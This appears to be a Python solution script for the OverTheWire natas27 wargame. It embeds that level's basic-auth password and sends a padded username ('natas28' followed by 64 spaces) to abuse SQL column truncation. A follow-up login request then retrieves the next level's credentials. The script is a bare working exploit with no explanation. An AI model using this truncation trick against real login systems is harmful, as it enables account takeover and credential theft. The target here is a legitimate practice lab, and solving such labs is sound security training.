import requests
import base64

URL = "http://natas27.natas.labs.overthewire.org"
auth_username = "natas27"
auth_password = "u3RRffXjysjgwFU6b9xa23i6prmUsYne"
headers = {"authorization": 'Basic {0}'.format(base64.b64encode((auth_username + ':' + auth_password).encode('utf8')).decode())}
data = {'username':'','password':''}


data['password'] = 'mypassword'
evil_username='natas28' + ' '*64 + 'a'
data['username'] = evil_username
response = requests.post(URL,data=data, headers=headers)
print(response.text)

data['username'] = "natas28"
response = requests.post(URL,data=data, headers=headers)
print(response.text)
